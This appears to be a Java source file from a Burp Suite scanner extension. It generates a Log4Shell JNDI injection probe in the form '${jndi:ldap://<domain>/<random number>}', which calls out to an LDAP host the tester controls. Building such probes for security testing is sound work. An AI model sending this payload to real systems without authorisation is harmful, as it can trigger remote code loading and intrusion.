package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC1 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi:ldap://" + domain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
    }
}
